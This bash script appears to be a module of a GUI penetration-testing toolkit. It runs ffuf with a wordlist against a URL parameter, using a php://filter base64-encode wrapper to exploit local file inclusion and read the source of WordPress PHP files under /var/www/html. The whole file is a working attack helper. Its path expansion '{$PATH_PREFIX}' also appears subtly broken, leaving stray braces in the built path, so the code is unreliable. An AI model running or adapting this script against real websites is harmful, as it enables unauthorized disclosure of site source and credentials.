#!/bin/bash

: '
ffuf: search for wordpress files in var www html with php filter base64
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?FUZZ=")
WORDLIST_FIELD=$(form_item "wordlist" "wordlist" "/usr/share/seclists/Discovery/Web-Content/common.txt")
PATH_PREFIX_FIELD=$(form_item "path prefix" "path_prefix" "/var/www/html/wordpress/")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${WORDLIST_FIELD}" "${PATH_PREFIX_FIELD}"

WEBSITE=${form_data["website"]}
WORDLIST=${form_data["wordlist"]}
PATH_PREFIX=${form_data["path_prefix"]}

execute_command "ffuf -w ${WORDLIST}:FILE -u '${WEBSITE}php://filter/read=convert.base64-encode/resource={$PATH_PREFIX}FILE.php' -fs 0"
create_new_line
